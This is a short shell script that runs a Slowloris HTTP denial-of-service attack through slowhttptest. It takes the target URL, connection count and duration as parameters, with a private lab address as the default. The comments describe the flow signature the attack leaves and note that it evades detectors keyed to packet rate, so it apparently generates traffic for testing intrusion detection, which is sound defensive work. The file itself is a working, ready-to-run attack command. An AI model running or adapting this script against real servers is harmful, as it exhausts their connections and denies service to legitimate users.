#!/bin/sh
# slowloris.sh — Slowloris HTTP DoS via slowhttptest.
# Opens many concurrent connections and sends headers very slowly,
# exhausting the server's connection pool without generating high packet rates.
# Key OIF signature: very long flow_duration_s (>60s), fwd_pkts_per_sec < 1,
# many simultaneous connections from the same source IP.
# This attack bypasses volumetric detectors that trigger on packet rate alone.
TARGET=${1:-http://172.20.0.10/}
CONNS=${2:-200}
DURATION=${3:-120}
echo "[attack] Slowloris → $TARGET  $CONNS connections  ${DURATION}s"
slowhttptest -c "$CONNS" -H -i 10 -r 50 -t GET -u "$TARGET" -x 24 -p "$DURATION"